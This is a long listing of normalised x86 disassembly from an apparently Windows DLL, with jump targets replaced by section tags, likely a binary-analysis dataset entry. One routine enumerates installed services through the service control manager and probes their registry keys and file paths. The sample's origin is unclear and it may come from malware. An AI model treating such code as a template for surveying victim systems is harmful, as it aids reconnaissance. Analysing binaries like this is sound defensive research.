retn
push ebx
xor eax eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
call sub_100531b0
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x2c ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10036380
lea ecx [ ebp - 0x2c ]
call sub_10029c40
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10039864
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10059065
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10039912
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_10007cfe
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_1003da17
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10041dbf
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] eax
cmp eax ebx
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10041dbf
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100796a0
add esp 0xc
sub_100399e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1002c5ed
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_10016d10
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_100796a0
add esp 0xc
sub_10039a90
push ebp
mov ebp esp
call sub_10025020
test eax eax
jne r-xdata
call [ ebp + 0x8 ]
pop ebp
retn 0x4
push esi
mov esi [ Sleep@IAT ]
push 0x2710
call esi
call sub_10025020
test eax eax
je r-xdata
pop esi
sub_10039ac0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_1004a540
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_10019820
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10039b60
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx edi
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp esi edi
jae r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
cmp esi edi
setne al
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
jmp r-xdata
sub_10039be0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
add esi 0x10
push ebx
mov eax [ esi + 0xc ]
mov [ edi + 0x1c ] eax
mov ecx [ esi + 0x10 ]
add esi 0x24
mov [ edi + 0x20 ] ecx
lea edx [ esi - 0x10 ]
add edi 0x24
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ebx 0x8
cmp [ edi + 0x14 ] ebx
jb r-xdata
lea eax [ esi - 0x10 ]
cmp edi eax
je r-xdata
mov eax edi
pop ebx
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] dx
cmp [ esi + 0x4 ] ebx
lea ebx [ esi - 0x10 ]
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_1006591f
add esp 0x4
mov edx [ ebx ]
mov [ edi ] edx
mov [ ebx ] 0x0
mov eax [ esi ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push ebx
push edi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
mov [ edi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ esi + 0x4 ] 0x7
mov [ esi ] 0x0
mov [ ebx ] dx
sub_10039cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081b44
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_1001ff50
mov eax [ esi + 0xb4 ]
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0xb8 ]
lea edx [ esi + 0xc0 ]
push edx
push ecx
push eax
call sub_10015b10
mov edx [ esi + 0xb4 ]
push edx
call sub_1006591f
add esp 0x14
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
call sub_10023cd0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x94 ]
push eax
call sub_1006591f
add esp 0x4
sub_10039d78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_100106d4
pop ecx
pop ebp
retn
sub_10039dc0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0xabc
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
mov [ ebp - 0xab0 ] edi
xor ebx ebx
mov [ ebp - 0xac0 ] ebx
mov [ ebp - 0xaa8 ] ebx
mov [ ebp - 0xabc ] ebx
mov [ ebp - 0xacc ] ebx
mov [ ebp - 0xab4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
lea edx [ ebp - 0xab8 ]
lea eax [ ebx + 0x2 ]
call sub_10058c10
lea edx [ ebp - 0xaac ]
lea eax [ ebx + 0x3 ]
call sub_10058c10
lea edx [ ebp - 0xaa4 ]
lea eax [ ebx + 0x4 ]
call sub_10058c10
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
mov edx 0x30c
lea ecx [ ebp - 0x690 ]
test eax eax
mov eax ecx
je r-xdata
sub esi ecx
xor edi edi
lea ebx [ ebp - 0xaac ]
sub ebx ecx
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1003d910
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0xaa4 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xaac ]
push eax
call sub_1003d910
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1003d910
test eax eax
jne r-xdata
lea edx [ ebp - 0xaac ]
push edx
call sub_1003d910
test eax eax
jne r-xdata
mov edi [ ebp - 0xab0 ]
lea eax [ ebp - 0xaa4 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xab8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaac ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
mov ebx eax
mov [ ebp - 0xab0 ] ebx
mov [ ebp - 0x4 ] 0x0
push 0x4
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
mov [ ebp - 0xac0 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a1b4
mov eax [ ebp - 0xabc ]
jmp r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xab4 ]
push eax
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push edi
mov esi [ EnumServicesStatusExW@IAT ]
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xab4 ]
push ecx
push 0x8
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0xaa8 ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xacc ]
push eax
mov ecx [ ebp - 0xab4 ]
push ecx
mov edx [ ebp - 0xaa8 ]
push edx
push 0x3
push 0x10
push 0x0
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
xor eax eax
call sub_10058c10
lea edx [ ebp - 0x30 ]
mov eax 0x1
call sub_10058c10
xor esi esi
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x898 ]
push ecx
mov ecx 0x104
call sub_10055350
imul esi esi 0x2c
mov edx [ ebp - 0xaa8 ]
mov eax [ esi + edx ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x898 ]
call sub_1003d910
push 0x80000002
lea ebx [ ebp - 0x690 ]
lea ecx [ ebp - 0x898 ]
call sub_1001b3e0
add esp 0x4
test eax eax
je r-xdata
mov esi [ ebp - 0xac8 ]
inc esi
jmp r-xdata
lea ecx [ ebp - 0xab8 ]
push ecx
push 0x20119
push 0x0
lea edx [ ebp - 0x898 ]
push edx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0xac8 ] esi
cmp esi [ ebp - 0xac4 ]
jae r-xdata
lea eax [ ebp - 0xaa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
lea edi [ ebp - 0xab8 ]
mov eax esi
call sub_10011360
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0xaa0 ]
push edx
call [ PathFileExistsW@IAT ]
mov [ ebp - 0xabc ] eax
test eax eax
jne r-xdata
sub_1003a1b4
mov eax [ ebp - 0xac0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xaa8 ]
test eax eax
je r-xdata
push eax
call [ CloseServiceHandle@IAT ]
retn
push eax
push 0x0
mov eax [ ebp - 0xab0 ]
push eax
call [ HeapFree@IAT ]
sub_1003a1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080d61
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
push edi
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
sub_1003a2a0
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_1003a310
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
push eax
lea esi [ edi + 0x8 ]
push esi
lea ecx [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
call sub_100615e0
push eax
mov ecx esi
call sub_10037140
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ edi + 0x4c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi ebx
call sub_10050f50
xor ebx ebx
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov [ edi + 0x4c ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_1003a3b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_10027136
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1004fd6f
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_1003a3e3
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
